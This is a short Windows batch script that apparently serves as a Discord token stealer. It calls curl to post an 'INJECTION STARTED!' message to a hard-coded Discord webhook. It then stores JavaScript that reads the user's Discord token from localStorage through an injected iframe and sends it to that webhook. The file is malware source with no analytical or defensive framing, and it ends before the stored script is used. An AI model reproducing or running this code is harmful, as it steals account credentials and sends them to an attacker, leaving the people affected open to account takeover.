@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" https://discord.com/api/webhooks/783718494843174952/ZS45zacZ6ZcSFO0p_xyttr6ckcni_T4XtEowFkjUFRacydhf_K0SpDhXFaQrWyJFoexH
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/783718494843174952/ZS45zacZ6ZcSFO0p_xyttr6ckcni_T4XtEowFkjUFRacydhf_K0SpDhXFaQrWyJFoexH', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
